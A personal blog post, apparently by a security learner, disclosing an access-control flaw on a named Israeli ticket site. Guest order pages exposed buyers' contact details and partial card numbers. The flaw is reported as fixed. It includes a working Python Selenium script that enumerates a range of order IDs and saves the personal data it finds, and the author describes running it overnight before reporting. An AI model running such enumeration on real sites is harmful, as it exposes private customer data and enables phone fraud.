---
layout: post
title: Data exposure due to misconfiguration on Shoppi site.
categories: [Red Team, Attacks]
tag: [Pentest] 

---
It's been a long time since I last wrote, during this time I'm really studying in depth to finish the OSCP certification, in between I'm doing things that are more related to research in the Israeli internet space. I found a website that sells tickets and due to a mistake by the developer, there was an access as a guest to all the details of the buyers, I will show you here what I found and what the problem actually is, by the way, I have already contacted the company itself and the developer sorted out the issue.

## How did I get to know this site.
It was about five or four months ago, my wife asked me to buy tickets for some show in the center of the country, we were looking for how to make the purchase online and found this website that sells tickets for that very uniq show we search for: `https://shoppi.co.il/`
On this site you can see that tickets are being sold for local authorities and even cities unit. We made a purchase that was as secure as any self-respecting website should do, and we thought that was the end of the story.

In fact, after several days, my wife explains to me that we need the number of tickets, after I searched in my email and did not find the details about the tickets number even though I had a purchase confirmation. Therefore, I started diging deep through the website to check how I can get the tickets numbers.

From there I started playing with the website, after several testing, I was able to found a location where I can enter a number, I mean a literally randomly generated number and if the number exists in the system it will retrieve the ticket details and the buyer's details, also the last four digit of the **credit card**. At first I thought it wasn't serious, but the deeper I went, the more I found that I was actually seeing details of different people who made a purchase for the same show.

So, let's brack that down, the site in some way, allow to access to pages that just the buyers should have access to, and see several details like phone number, full name, enail address and event the last 4 digit of credit card. This can allow some scammer to make phone call to the buyer and identifying it self as the site director, or support that calling about some issue regarding the purche for example. So, it can be sound like a real call and not scammer, just renember that this scammer have the last 4 digit, so he can tell the buyer that the purche must be done again becouse some issue to recharge the credit card.

After, I realied that this is more then some simple issue, one evening I said to myself, let's write a code and let it run at night and in the morning we will check if the number of the card is found.
It took me a while to write the code, but in the end it worked. I left the code running at night.

In the morning when I got up and ran a search on my Linux on the results of what my code performed I found the ticket and it's information, but I also realized that what I found was in fact unauthorized access to sensitive information about various buyers and thire credit cards on this site. It is possible that if I had dig more I might have come to the disclosure of full credit information, who knows.

## How the data exposure was found.

Let's look on the techincal details, as soon as I entered the site and made an enumeration I found the following link:
`https://shoppi.co.il/profile/guest/order-details/<order_number>`
As you can see, the access to this landing page is registered on a `guest` profile, which mean, while the url was exposed, any guest could access this link. So ticket number can be generated randomly, the number itself is obviously different from each, and it can be number with 6 digit or event more.

The code I wrote is based on Python and uses a module called `selenium`, using this module which contains a class called `webdriver` actually makes it possible to render data from a landing page and display it in the way that we want to use in the code for dispay the data back.

Please note, **I do not show the credit card on that POC code**. This is important, because if I do show you the numbers, I allow scammers to commit scams by contact the buyers.

{% highlight python %}

#!/usr/bin/env python
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import concurrent.futures

# Function to process each URL
def process_url(order_number):
    # Construct the URL for each order
    url = f"https://shoppi.co.il/profile/guest/order-details/{order_number}"
    
    # Set up Chrome options for headless mode
    options = webdriver.ChromeOptions()
    options.add_argument("--headless")  # Run in headless mode
    driver = webdriver.Chrome(options=options)
    
    try:
        # Navigate to the order details page
        driver.get(url)
        wait = WebDriverWait(driver, 10)
        
        # Search for specific words on the page
        keywords = ["@gmail.com", "שם", "אמייל", "טלפון", "מועד", "מצב"]
        found_elements = []
        for keyword in keywords:
            # Wait for the presence of an element containing the keyword
            dynamic_element = wait.until(EC.presence_of_element_located((By.XPATH, f"//*[contains(text(), '{keyword}')]")))
            found_elements.append(dynamic_element.text)
        
        # Create a result string with order details
        result = f"Order {order_number}: {' | '.join(found_elements)}"
        
        # Print the result to the screen
        print(result)
        
        # Write the result to a file
        with open("results.txt", "a") as file:
            file.write(f"Order {order_number}: {','.join(found_elements)}\n")
    except:
        # Handle the case where some keywords are not found on the page
        result = f"Order {order_number}: Some keywords not found"
        print(result)
    
    # Close the Chrome driver
    driver.quit()

# Define the range of URLs you want to visit
start_order = 996000
end_order = 997000

# Process URLs in parallel using a ThreadPoolExecutor
with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
    executor.map(process_url, range(start_order, end_order + 1))

  {% endhighlight %}

This code uses, as I said earlier, Selenium module to scrape information from a series of URLs related to online orders. It processes multiple URLs in parallel using a ThreadPoolExecutor, and the results are printed to the screen and written to a file named "results.txt". The specific keywords searched for on each page are specified in the keywords list. The code is designed to handle the case where some keywords are not found on a page.

As you can see, since it is an Israeli site, the keywords are in Hebrew, therefore this keywords is used in order to capture the required information and divide it in such a way that the code can display this information properly on the screen.

After running the code, we will receive the interesting detail that will contain the buyers names, phone numbers, as well as the ticket number field, and also data such as address and number of purchases.

<iframe width="800" height="450" src="https://www.youtube.com/embed/L6JIAX0pmM4" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>

Also I want to clearefy, if we are able to access a webpage that contains sensitive information without using any unauthorized means, such as hacking or exploiting vulnerabilities, it might be a case of **unintentional exposure** or **misconfiguration**. In such situations, the responsibility lies with the website or system administrator for not properly securing or configuring access controls.

In the context described here, it may not be classified as **unauthorized access** in the traditional sense, as, in that case, not actively circumventing security measures. Instead, it could be seen as a result of inadequate security practices or oversight on the part of the website's developers or administrators.

However, it's important to note that even if access is unintentional or due to misconfiguration, accessing and extracting sensitive information without proper authorization could still be considered **unethical and possibly illegal**. If we discover such issues, it's recommended to report them to the website or system administrators so that they can address the security vulnerabilities appropriately.

In terms of terminology, we might hear phrases like **data exposure due to misconfiguration** or **security misconfiguration** being used to describe situations where sensitive information is inadvertently made accessible.

## What was done after that vuln was found.

I have made content to the site's support, and they told me that they pass that info to the development team in the end, I passed them the code and the POC that proves the very existence of unauthorized access, after a few days they solved the problem and it is no longer possible to access the same landing pages as a guest.

Only after registration to the site, you will be able see the personal tickets and more details. If, for some reason, authorization was not performed and only a purchase was done, the data will still be folded in the email.

If details are missing, contact the site's technical team and they will be able to provide the applicants with the details you are looking for.

I am very excited about this. I actually found a type of weakness (or misconfiguration if you want) that is based on application that is lake of secure deployment and ignores several important layers at the development level.

I hope that from here I will be able to raise my head again and find more serious weaknesses. It is clear to me that it requires time and experience, but as long as there is a pulse in the heart and desire, it can be done.

Just remember, if Trump was president, then any commoner can be, even me.

greetings

Guy Zwerdling







